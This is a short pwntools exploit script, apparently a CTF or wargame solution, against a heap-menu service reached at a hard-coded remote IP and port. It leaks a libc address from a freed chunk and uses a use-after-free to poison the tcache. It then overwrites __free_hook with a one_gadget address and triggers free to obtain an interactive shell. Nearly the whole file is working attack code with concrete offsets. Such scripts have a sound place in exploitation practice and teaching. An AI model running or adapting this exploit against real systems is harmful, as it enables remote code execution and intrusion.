from pwn import *

context.log_level = 'debug'

libc = ELF('libc-2.27.so')
libc_rop = ROP(libc)

#p = remote('localhost', 1000)
p = remote('147.46.113.56', 25395)

#####################################################
# Helper functions

def allocate_chunk(idx, size):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())

def free_chunk(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit_chunk(idx, data):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Data: ', data)

def view_chunk(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(b': ')
    return p.recvline().strip()

#####################################################
# Leak libc address

allocate_chunk(0, 0x500)
allocate_chunk(1, 0x500)

free_chunk(0)

tmp = view_chunk(0)
libc_leak = u64(tmp[:8].ljust(8, b'\x00'))
libc_offset = 0x3ebca0
LIBC_BASE = libc_leak - libc_offset

print(f'Leaked libc address: {hex(libc_leak)}')
print(f'Calculated libc base: {hex(LIBC_BASE)}')


####################################################
# Exploit

allocate_chunk(2, 0x20)
free_chunk(2)
edit_chunk(2, p64(LIBC_BASE + libc.symbols['__free_hook']))
allocate_chunk(3, 0x20)
allocate_chunk(4, 0x20) # <- target

ONEGADGET = 0x4f322
edit_chunk(4, p64(LIBC_BASE + ONEGADGET))

free_chunk(1)

p.interactive()